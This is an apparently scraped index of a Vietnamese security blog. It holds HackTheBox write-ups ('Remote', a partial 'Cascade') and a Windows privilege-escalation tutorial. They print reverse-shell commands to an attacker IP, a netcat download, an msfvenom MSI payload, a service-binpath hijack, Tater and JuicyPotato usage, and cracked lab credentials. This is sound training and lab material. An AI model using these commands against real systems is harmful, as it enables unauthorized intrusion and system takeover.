ng√†y 18-08-2020, Kali Linux release phi√™n b·∫£n 2020.3 v·ªõi nhi·ªÅu c·∫£i ti·∫øn nh∆∞ thay th·∫ø Bash truy·ªÅn th·ªëng sang ZSH,\u0026hellip; nh∆∞ng ƒë·ªëi v·ªõi m√¨nh, ·∫•n t∆∞·ª£ng h∆°n c·∫£ l√† Win-KeX (Windows + Kali Desktop EXperience) ƒë∆∞·ª£c Kali h·ªó tr·ª£ ƒë·ªÉ s·ª≠ d·ª•ng giao di·ªán ƒë·ªì ho·∫° v·ªõi WSL2 tr√™n Windows.\nC√≥ th·ªÉ th·∫•y r·∫±ng vi·ªác b·∫°n s·ª≠ d·ª•ng Windows nh∆∞ng v·∫´n mu·ªën hacking tr√™n Kali Linux m√† kh√¥ng mu·ªën b·∫≠t VMWare l√™n hay Dual-boot th√¨ ƒë√¢y ch√≠nh l√† gi·∫£i ph√°p cho b·∫°n, qu√° tr√¨nh kh·ªüi ƒë·ªông c≈©ng r·∫•t nhanh n·ªØa :D.","title":"Win-KeX - k√©o Windows v√† Kali ho√† l√†m m·ªôt"},{"content":"Recon Nmap Vi·ªác s·ª≠ d·ª•ng nmap ƒë·ªÉ qu√©t to√†n b·ªô c·ªïng c·ªßa machine l√† 1 vi·ªác l√†m b·∫•t di b·∫•t d·ªãch n·∫øu c√°c b·∫°n mu·ªën t·∫•n c√¥ng l√™n machine ƒë√≥.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49678/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 3m03s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-12T13:13:30 |_ start_date: N/A   ·ªû ƒë√¢y ch√∫ng ta th·∫•y c√≥ kh√° nhi·ªÅu port ƒëang m·ªü, m√¨nh th√¨ hay kh√°m ph√° c√°c d·ªãch v·ª• web tr∆∞·ªõc :P. Tuy nhi√™n v√†o trang web th√¨ c≈©ng ch·∫≥ng c√≥ g√¨ nhi·ªÅu.\nFuzz Check qua m·ªôt l∆∞·ª£t trang web d∆∞·ªùng nh∆∞ kh√¥ng c√≥ g√¨, th√¨ ch√∫ng ta c·∫ßn fuzzing xem c√≥ d·ªãch v·ª• web n√†o t·∫°i port 80 n·ªØa kh√¥ng.\nS·ª≠ d·ª•ng gobuster ƒë·ªÉ recon:\n1  gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirb/common.txt   K·∫øt qu·∫£ c√≥ 1 th∆∞ m·ª•c l√† /umbraco ch·∫°y Umbraco CMS\nC√≥ m·ªôt trang ƒëƒÉng nh·∫≠p\nGet User Searchsploit xem c√≥ CVE n√†o k th√¨ th·∫•y c√≥ 1 c√°i RCE ƒë∆∞·ª£c\n1 2  ‚ûú Remote searchsploit umbraco Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution | exploits/aspx/webapps/46153.py   Nh∆∞ng r·∫•t ti·∫øc l√† c·∫ßn ph·∫£i ƒëƒÉng nh·∫≠p m·ªõi c√≥ th·ªÉ RCE ƒë∆∞·ª£c, ti·∫øp t·ª•c ƒëi t√¨m t√†i kho·∫£n ƒëƒÉng nh·∫≠p c·ªßa web.\nTrong k·∫øt qu·∫£ nmap th·∫•y c√≥ c·ªïng 111 ƒëang m·ªü, ·ªü Linux c√≥ l·ªánh showmount ƒë·ªÉ xem c√≥ th∆∞ m·ª•c n√†o ƒëang public hay kh√¥ng\n1 2 3  ‚ûú Remote sudo showmount -e remote.htb Export list for remote.htb: /site_backups (everyone)   Th·∫•y c√≥ th∆∞ m·ª•c public, th·ª±c hi·ªán mount v√†o ƒë·ªÉ ƒë·ªçc th√™m th√¥ng tin\n1 2 3 4  ‚ûú Remote sudo mount -t nfs remote.htb:/site_backups . ‚ûú Remote ls App_Browsers App_Plugins bin css Global.asax scripts Umbraco_Client Web.config App_Data aspnet_client Config default.aspx Media Umbraco Views   Qu√° tr·ªùi qu√° ƒë·∫•t th∆∞ m·ª•c, ƒë·ªçc l·∫ßn l∆∞·ª£t th√¨ th·∫•y c√≥ 1 file t√™n l√† Umbrella.sdf. Khuy·∫øn kh√≠ch m·ªü file n√†y b√™n Win, m·ªü b√™n Kali lag l√≤i k√®n @@\nTh·∫•y c√≥ m·ªôt v√†i m√£ hash passwd, list ra. ƒê√£ s·ª≠ d·ª•ng psexe.py v·ªõi nh·ªØng hash n√†y nh∆∞ng k ƒë∆∞·ª£c, s·ª≠ d·ª•ng John ƒë·ªÉ crack passwd th√¨ l·∫•y ƒë∆∞·ª£c 1 account t√™n l√† admin@htb.local:baconandcheese. S·ª≠ d·ª•ng t√†i kho·∫£n n√†y ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o trang login l√∫c n√£y th√¨ ƒëƒÉng nh·∫≠p ƒë∆∞·ª£c.\nKi·ªÉm tra phi√™n b·∫£n ƒë√∫ng l√† phi√™n b·∫£n 7.12.4, s·ª≠ d·ª•ng l·ªó h·ªïng RCE b√™n tr√™n t√¨m ƒë∆∞·ª£c ƒë·ªÉ khai th√°c, th·ª±c hi·ªán custom m√£ ƒëi m·ªôt ch√∫t.\n1  Invoke-WebRequest -Uri http://10.10.14.5:8080/nc.exe -OutFile C:/windows/temp/nc.exe; C:/windows/temp/nc.exe 10.10.14.5 4444 -e powershell   Ho·∫∑c ƒë∆°n gi·∫£n h∆°n c√≥ th·ªÉ s·ª≠ d·ª•ng m√£ kh√°c x·ªãn h∆°n t·∫°i https://github.com/noraj/Umbraco-RCE, m√£ n√†y d·ªÖ s·ª≠ d·ª•ng h∆°n v√† k c·∫ßn ph·∫£i custom gi·ªëng m√£ tr√™n exploitdb\nL·∫•y ƒë∆∞·ª£c c·ªù user trong Public\nGet Root Vi·ªác l√™n Root n√†y m√¨nh ƒë√£ c√≥ b√†i vi·∫øt chi ti·∫øt t·∫°i https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj\nKi·ªÉm tra d·ªãch v·ª• ƒëang c√≥ tr√™n box\n1 2  PS C:\\Users\\Administrator\\Documents\u0026gt; Get-Service Stopped UsoSvc Update Orchestrator Service   C√≥ d·ªãch v·ª• n√†y c·ªßa Windows Update, t√¨m th·∫•y tr√™n Payload All The Thing cve-2019-1322-usosvc\nC√≥ payload r·ªìi, v·∫≠y th√¨ c·ª© step by step l√† ra th√¥i :D\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  PS C:\\Windows\\system32\u0026gt; sc.exe stop UsoSvc PS C:\\Windows\\system32\u0026gt; sc.exe config UsoSvc binpath= \u0026#34;cmd \\c C:\\nc.exe 10.10.14.5 4444 -e cmd.exe\u0026#34; PS C:\\Windows\\system32\u0026gt; sc.exe qc usosvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: usosvc TYPE  : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START (DELAYED) ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\nc.exe 10.10.14.5 4444 -e cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Update Orchestrator Service DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem PS C:\\Windows\\system32\u0026gt; sc.exe start UsoSvc   L√™n root r·ªìi l·∫•y c·ªù cu·ªëi th√¥i :D\n1 2 3  PS C:\\Users\\Administrator\u0026gt; cd Desktop PS C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt 3b9f87e333e859963172519b3b724462   K·∫øt lu·∫≠n ƒê√¢y l√† m·ªôt b√†i kh√° c∆° b·∫£n v·ªõi machine Windows, hi v·ªçng c√°c b·∫°n ƒë·ªçc b√†i vi·∫øt n√†y c·ªßa m√¨nh s·∫Ω thu l·∫°i ƒë∆∞·ª£c th·ª© g√¨ ƒë√≥, happy hacking :D\n","permalink":"https://minhtuanact.ml/posts/hackthebox-writeup-remote/","summary":"Recon Nmap Vi·ªác s·ª≠ d·ª•ng nmap ƒë·ªÉ qu√©t to√†n b·ªô c·ªïng c·ªßa machine l√† 1 vi·ªác l√†m b·∫•t di b·∫•t d·ªãch n·∫øu c√°c b·∫°n mu·ªën t·∫•n c√¥ng l√™n machine ƒë√≥.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.","title":"[Hackthebox - Writeup] Remote"},{"content":"Gi·ªõi thi·ªáu G·∫ßn m·ªôt th√°ng tr∆∞·ªõc m√¨nh c√≥ public 1 b√†i Leo thang ƒë·∫∑c quy·ªÅn trong Windows - Windows Privilege Escalation #1: Service Exploits . ƒê·ªÉ ti·∫øp t·ª•c series n√†y, nay m√¨nh vi·∫øt ti·∫øp c√°c c√°ch khai th√°c ƒë·∫∑c quy·ªÅn tr√™n Windows.\n B√†i vi·∫øt h∆∞·ªõng ƒë·∫øn cho m·ªçi ng∆∞·ªùi c√°ch nh√¨n t·ªïng quan v·ªÅ leo quy·ªÅn tr√™n Windows, c√°c b·∫°n c√≥ th·ªÉ g·∫∑p n√≥ trong c√°c cu·ªôc thi nh∆∞ OSCP, OSWE, c√°c labs tr√™n hackthebox.eu hay Vulnhub, \u0026hellip;\n B√†i vi·∫øt n√†y ƒë∆∞·ª£c d·ª±a theo kho√° h·ªçc Windows Privilege Escalation for OSCP \u0026amp; Beyond!  tr√™n Udemy v√† Windows / Linux Local Privilege Escalation Workshop  c·ªßa sagishahar.\nStored Credentials Password Nguy√™n nh√¢n ƒê√¥i khi vi·ªác leo thang ƒë·∫∑c quy·ªÅn n√≥ d·ªÖ nh∆∞ vi·ªác t√¨m th·∫•y m·∫≠t kh·∫©u c·ªßa Administrator, v√† ƒë√¥i khi c√≥ m·ªôt s·ªë v·ªã tr√≠ v√† v√†i ph∆∞∆°ng ph√°p ph·ªï bi·∫øn ƒë·ªÉ t√¨m ki·∫øm m·∫≠t kh·∫©u tr√™n Windows. Ch√∫ng ta c√≥ th·ªÉ t√¨m th·∫•y trong registry ho·∫∑c trong c√°c file trong h·ªá th·ªëng c√≥ ch·ª©a username v√† password Khai th√°c V·∫≠y khi c√≥ username v√† password r·ªìi th√¨ c√≥ th·ªÉ switch sang user ƒë√≥ theo b√†i vi·∫øt m√¨nh ƒë√£ vi·∫øt t·∫°i\nL√†m th·∫ø n√†o ƒë·ªÉ chuy·ªÉn ƒë·ªïi t√†i kho·∫£n tr√™n Windows (How do I switch users in Windows)? \nM√¨nh ƒë√°nh gi√° ki·ªÉu khai th√°c n√†y v·ª´a d·ªÖ v·ª´a kh√≥, d·ªÖ l√† c√≥ th·ªÉ t√¨m ƒë∆∞·ª£c ngay password c·ªßa Administrator, c√≤n kh√≥ l√† vi·ªác t√¨m password Administrator ƒë∆∞·ª£c gi·∫•u r·∫•t k·ªπ v√† gi·∫£i m√£ r·∫•t l·∫±ng nh·∫±ng th√¨ n√≥ qu·∫£ th·ª±c l√† r·∫•t kh√≥.\n V√≠ d·ª• 1: https://www.youtube.com/watch?v=UJ3rK8PyY_w\nV√≠ d·ª• 2: https://www.youtube.com/watch?v=2fF4Xre-w2g\nV√≠ d·ª• 3: https://www.youtube.com/watch?v=sm9xgpgaEQw\n Kernel Exploits Windows Kernel Exploitation Nguy√™n nh√¢n V·ªõi vi·ªác OS ƒë∆∞·ª£c update th∆∞·ªùng xuy√™n th√¨ vi·ªác khai th√°c qua kernel d∆∞·ªùng nh∆∞ l√† b·∫•t kh·∫£ thi, tuy nhi√™n ch√∫ng ta v·∫´n c·∫ßn ki·ªÉm tra Kernel c·ªßa Windows. C√≥ th·ªÉ s·ª≠ d·ª•ng Watson ƒë·ªÉ ki·ªÉm tra xem c√≥ l·ªó h·ªïng n√†o ch∆∞a ƒë∆∞·ª£c v√°. Watson ƒë√£ ƒë∆∞·ª£c t√≠ch h·ª£p b√™n trong winPEAS r·ªìi. Trong tr∆∞·ªùng h·ª£p ph√°t hi·ªán ra l·ªó h·ªïng n√†o v·ªõi kernel, s·ª≠ d·ª•ng kho l∆∞u tr·ªØ https://github.com/SecWiki/windows-kernel-exploits ƒë·ªÉ ki·ªÉm tra v√† khai th√°c. N·∫øu c·∫ßn bi√™n d·ªãch code C th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng Kali ƒë·ªÉ bi√™n d·ªãch r·ªìi upload l√™n machine\nHo·∫∑c c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng Windows-Exploit-Suggester b·∫±ng c√°ch l∆∞u l·∫°i systeminfo r·ªìi ch·∫°y ƒëo·∫°n m√£ n√†y s·∫Ω cho ra ƒë∆∞·ª£c nh·ªØng g·ª£i √Ω ƒë·ªÉ khai th√°c Kernel. Tuy nhi√™n, v·ªõi kh√° nhi·ªÅu l·ªói Kernel ƒë·∫øn t·ª´ Windows, vi·ªác khai th√°c n√†y r·∫•t m·∫•t th·ªùi gian v√¨ m·ªói l·∫ßn ch·∫°y Windows-Exploit-Suggester m√¨nh ƒë∆∞·ª£c n√≥ g·ª£i √Ω ra kho·∫£ng 100 c√°i m√£ khai th√°c, th·∫≠t l√† ƒë√°ng s·ª£ :'(\nKhai th√°c V√≠ d·ª•: https://medium.com/@ranakhalil101/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb V√≠ d·ª• 2: https://youtu.be/HTM-BavQvs4\nOptions Install Windows Always Install Elevated Nguy√™n nh√¢n Windows c√≥ th·ªÉ cho ph√©p low privilege users c√≥ quy·ªÅn c√†i ƒë·∫∑t Microsoft Windows Installer Package (MSI) v·ªõi quy·ªÅn SYSTEM b·ªüi AlwaysInstallElevated group policy.\nKhai th√°c S·ª≠ d·ª•ng ƒë·∫∑c quy·ªÅn ƒë∆∞·ª£c c√†i ƒë·∫∑t MSI c·ªßa users quy·ªÅn th·∫•p, attacker c√≥ th·ªÉ t·∫°o m·ªôt ch∆∞∆°ng tr√¨nh MSI ch·ª©a payload ƒë·ªôc h·∫°i ƒë·ªÉ leo l√™n quy·ªÅn SYSTEM.\nKi·ªÉm ra vi·ªác AlwaysInstallElevated c√≥ ƒë∆∞·ª£c b·∫≠t v·ªõi user hi·ªán t·∫°i, s·ª≠ d·ª•ng winPEAS.exe S·ª≠ d·ª•ng msfvenom ƒë·ªÉ t·∫°o payload v·ªõi format file MSI 1  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=8080 -f msi -o evil.msi   ƒê·∫©y file evil.msi l√™n machine v√† s·ª≠ d·ª•ng c√¢u l·ªánh sau ƒë·ªÉ c√†i ƒë·∫∑t\n1  msiexec /quiet /qn /i C:\\temp\\evil.msi   (Nh·ªõ tr∆∞·ªõc khi c√†i ƒë·∫∑t th·ª±c hi·ªán l·∫Øng nghe tr√™n c·ªïng ƒë√£ khai b√°o)\n V√≠ d·ª• video: https://youtu.be/9LpsofQN_ao\n Scheduled Tasks Nguy√™n nh√¢n C√°c ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c l·∫≠p l·ªãch (scheduled) ƒë∆∞·ª£c khai th√°c gi·ªëng v·ªõi Linux (khai th√°c v·ªõi crontab), vi·ªác khai th√°c v·ªõi Scheduled Tasks kh√° l√† kh√≥ khƒÉn, tuy nhi√™n n·∫øu c√≥ th·ªÉ t√¨m th·∫•y m·ªôt t·ªáp ho·∫∑c ch∆∞∆°ng tr√¨nh n√†o ƒë√≥ ƒëang ch·∫°y nh∆∞ m·ªôt ph·∫ßn c·ªßa t√°c v·ª• theo scheduled th√¨ v·∫´n c√≥ th·ªÉ leo thang ƒë·∫∑c quy·ªÅn.\nKhai th√°c Vi·ªác khai th√°c th√¨ c≈©ng t√πy v√†o nh·ªØng case c·ª• th·ªÉ. V√≠ d·ª• 2 tr∆∞·ªùng h·ª£p b√™n d∆∞·ªõi:\nhttps://www.youtube.com/watch?v=J-GlK59M0Yw\nhttps://youtu.be/Kgga91U3B4s\nHot Potato Nguy√™n nh√¢n L√† m·ªôt l·ªói trong Windows, khai th√°c qua NTLM relay (specifically HTTP-\u0026gt;SMB relay) v√† NBNS spoofing. C·ª• th·ªÉ c√°ch khai th√°c ƒë∆∞·ª£c vi·∫øt ƒë·∫ßy ƒë·ªß t·∫°i https://github.com/foxglovesec/Potato\nKhai th√°c S·ª≠ d·ª•ng module Tater ƒë∆∞·ª£c download t·∫°i https://github.com/Kevin-Robertson/Tater ƒë·ªÉ khai th√°c. Th·ª±c hi·ªán kh·ªüi ƒë·ªông powershell noprofile\n1  powershell -ep bypass -nop   Import module Tater\n1  Import-Module .\\Tater.ps1   G·ªçi function Tater ƒë·ªÉ ti·∫øn h√†nh khai th√°c\n1  Invoke-Tater -Trigger 1 -Command \u0026#34;net user user /add \u0026amp;\u0026amp; net localgroup administrators tater /add\u0026#34;   Khai th√°c xong ti·∫øn h√†nh ki·ªÉm tra t√†i kho·∫£n user ƒë√£ ƒë∆∞·ª£c th√™m v√†o group Administrator hay ch∆∞a Ho·∫∑c c√≥ th·ªÉ thay ƒë·ªïi c√¢u command net user user /add \u0026amp;\u0026amp; net localgroup administrators tater /add th√†nh th·ª±c thi file reverse exe c≈©ng ƒë∆∞·ª£c, l√∫c ƒë√≥ ch√∫ng ta s·∫Ω c√≥ SYSTEM.\nJuicy Potato (abusing the golden privileges) Nguy√™n nh√¢n C√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc nguy√™n nh√¢n t·∫°i sao v√† do ƒë√¢u ·ªü ƒë√¢y Rotten Potato ‚Äì Privilege Escalation from Service Accounts to SYSTEM\nƒê·ªÉ ph√°t hi·ªán ra l·ªói n√†y, c√°c b·∫°n c√≥ th·ªÉ ch·∫°y l·ªánh whoami /all ƒë·ªÉ ki·ªÉm tra xem mode SeImpersonate ho·∫∑c SeAssignPrimaryToken ƒëang ƒë∆∞·ª£c b·∫≠t hay kh√¥ng.\nSau ƒë√≥, ch√∫ng ta c√≥ th·ªÉ l·∫°m d·ª•ng m·ªôt v√†i c·ªïng COM v·ªõi CLSID c√≥ th·ªÉ l√™n ƒë∆∞·ª£c quy·ªÅn SYSTEM.\nKhai th√°c   S·ª≠ d·ª•ng file binary download t·∫°i https://github.com/ohpe/juicy-potato/releases\n  Upload file JuicyPotato.exe l√™n machine.\n  L·∫•y m√£ CLSID tu·ª≥ thu·ªôc v√†o OS c√≥ t·∫°i Windows CLSID \n  S·ª≠ d·ª•ng\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  - T:\\\u0026gt;JuicyPotato.exe JuicyPotato v0.1 Mandatory args: -t createprocess call: \u0026lt;t\u0026gt; CreateProcessWithTokenW, \u0026lt;u\u0026gt; CreateProcessAsUser, \u0026lt;*\u0026gt; try both -p \u0026lt;program\u0026gt;: program to launch -l \u0026lt;port\u0026gt;: COM server listen port Optional args: -m \u0026lt;ip\u0026gt;: COM server listen address (default 127.0.0.1) -a \u0026lt;argument\u0026gt;: command line argument to pass to program (default NULL) -k \u0026lt;ip\u0026gt;: RPC server ip address (default 127.0.0.1) -n \u0026lt;port\u0026gt;: RPC server listen port (default 135) -c \u0026lt;{clsid}\u0026gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) -z only test CLSID and print token\u0026#39;s user     V√≠ d·ª•: Machine c·ªßa b·∫°n l√† Win 7 Enterprise ta l·∫•y ƒë∆∞·ª£c m√£ CLSID l√† {555F3418-D99E-4E51-800A-6E89CFD8B1D7}, s·ª≠ d·ª•ng JuicyPotato.exe.\n./JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}\nC√≥ th·ªÉ thay c:\\windows\\system32\\cmd.exe b·∫±ng file reverse shell exe ƒë·ªÉ l·∫•y SYSTEM.\n  K·∫øt V·∫≠y l√† m√¨nh ƒë√£ tr√¨nh b√†y c√°c c√°ch leo thang ƒë·∫∑c quy·ªÅn tr√™n Windows, c√≤n m·ªôt v√†i c√°ch l√™n SYSTEM tr√™n Windows n·ªØa khai th√°c Active Directory d·ª± ƒë·ªãnh m√¨nh s·∫Ω vi·∫øt v√†o b√†i sau. C·∫£m ∆°n b·∫°n ƒë·ªçc ƒë√£ theo d√µi :).\n","permalink":"https://minhtuanact.ml/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/","summary":"Gi·ªõi thi·ªáu G·∫ßn m·ªôt th√°ng tr∆∞·ªõc m√¨nh c√≥ public 1 b√†i Leo thang ƒë·∫∑c quy·ªÅn trong Windows - Windows Privilege Escalation #1: Service Exploits . ƒê·ªÉ ti·∫øp t·ª•c series n√†y, nay m√¨nh vi·∫øt ti·∫øp c√°c c√°ch khai th√°c ƒë·∫∑c quy·ªÅn tr√™n Windows.\n B√†i vi·∫øt h∆∞·ªõng ƒë·∫øn cho m·ªçi ng∆∞·ªùi c√°ch nh√¨n t·ªïng quan v·ªÅ leo quy·ªÅn tr√™n Windows, c√°c b·∫°n c√≥ th·ªÉ g·∫∑p n√≥ trong c√°c cu·ªôc thi nh∆∞ OSCP, OSWE, c√°c labs tr√™n hackthebox.","title":"Leo thang ƒë·∫∑c quy·ªÅn trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ..."},{"content":"Cascade l√† b√†i th·ª© m·∫•y m√¨nh ch∆°i v·ªõi machine Windows tr√™n hackthebox c≈©ng kh√¥ng nh·ªõ n·ªØa, ch·ªâ nh·ªõ l√† b√†i n√†y m√¨nh l√†m v√†o ƒë√∫ng t·ªëi sinh nh·∫≠t nƒÉm nay c·ªßa m√¨nh. L√† m·ªôt b√†i kh√° hay v·ªõi LDAP, m√¨nh ƒë√£ h·ªçc h·ªèi ƒë∆∞·ª£c r·∫•t nhi·ªÅu th·ª© t·ª´ b√†i n√†y. Nh√¨n l∆∞·ª£t vote c≈©ng th·∫•y ƒë∆∞·ª£c b√†i n√†y ch·ªß y·∫øu s·ª≠ d·ª•ng k·ªπ thu·∫≠t Enumeration. Hi v·ªçng writeup n√†y gi√∫p √≠ch g√¨ ƒë∆∞·ª£c cho c√°c b·∫°n ƒë·ªçc b√†i n√†y :P.\nRecon S·ª≠ d·ª•ng enum4linux th√¨ list ra ƒë∆∞·ª£c 1 danh s√°ch ng∆∞·ªùi d√πng\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f]   Tuy nhi√™n m√¨nh ƒëang t·∫≠p trung ch·ªß y·∫øu v√†o Group n√†y v√¨ th·∫•y n√≥ l·∫° l·∫°, c√≥ linh c·∫£m c·∫ßn ph·∫£i t·∫•n c√¥ng v√†o ƒë√¢y.\n1  Group \u0026#39;AD Recycle Bin\u0026#39; (RID: 1119) has member: CASCADE\\arksvc   Loay hoay 1 h·ªìi nh∆∞ng ch·∫≥ng ph√°t hi·ªán ƒë∆∞·ª£c g√¨ t·∫°i ƒë√¢y c·∫£.\nM√¨nh th·ª≠ kh√° nhi·ªÅu tr∆∞·ªùng h·ª£p, l·∫•y ra 1 list user r·ªìi cho v√†o GetNPUser.py c≈©ng kh√¥ng dump ƒë∆∞·ª£c hash passwd n√†o\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ‚ûú Cascade sudo GetNPUsers.py cascade.local/ -usersfile user -format john Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User arksvc doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.smith doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User r.thompson doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User util doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User j.wakefield doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.hickson doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User j.goodhand doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User a.turnbull doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User d.burman doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User BackupSvc doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User j.allen doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)   ƒê·∫øn ƒë√¢y th√¨ th·ª±c s·ª± b·∫ø t·∫Øc, lang thang tr√™n m·∫°ng m·ªôt h·ªìi th√¨ m√¨nh t√¨m th·∫•y ·ªü ƒë√¢y ki·ªÉm tra k·∫øt n·ªëi LDAP t·ª´ ph√≠a client https://serverfault.com/questions/452935/how-to-test-a-ldap-connection-from-a-client\n1  ‚ûú Cascade ldapsearch -x -b \u0026#34;dc=cascade, dc=local\u0026#34; -h 10.10.10.182 \u0026gt; ldapsearch.txt   Do danh s√°ch qu√° d√†i n√™n m√¨nh l∆∞u v√†o file ldapsearch.txt ƒë·ªÉ xem\n1 2 3 4 5 6 7 8 9 10 11 12 13  ‚ûú Cascade cat ldapsearch.txt| grep \u0026#34;Pwd\u0026#34; maxPwdAge: -9223372036854775808 minPwdAge: 0 minPwdLength: 5 badPwdCount: 0 maxPwdAge: -37108517437440 minPwdAge: 0 minPwdLength: 0 badPwdCount: 0 badPwdCount: 0 badPwdCount: 0 badPwdCount: 0 cascadeLegacyPwd: clk0bjVldmE=   ·ªû ƒë√¢y m√¨nh nh·∫≠n ƒë∆∞·ª£c 1 ƒëo·∫°n string cascadeLegacyPwd: clk0bjVldmE= c√≥ l·∫Ω l√† passwd c≈© ho·∫∑c passwd m·∫∑c ƒë·ªãnh, s·ª≠ d·ª•ng passwd n√†y th·ª≠ v·ªõi t·∫•t c·∫£ user b√™n tr√™n xem ƒëƒÉng nh·∫≠p ƒë∆∞·ª£c v·ªõi user n√†o kh√¥ng, ƒë·∫ßu ti√™n ph·∫£i decode passwd ra tr∆∞·ªõc ƒë√£\n1 2  ‚ûú Cascade echo -n clk0bjVldmE= | base64 -d rY4n5eva   ƒê·∫ßu ti√™n m√¨nh th·ª≠ v·ªõi Evil-WinRM nh∆∞ng m√† k ho·∫°t ƒë·ªông, sau ƒë√≥ m√¨nh th·ª≠ v·ªõi smb th√¨ ƒë∆∞·ª£c 1 t√†i kho·∫£n r.thompson\n1 2 3 4 5 6 7 8 9 10 11 12 13  ‚ûú Cascade sudo smbclient.py 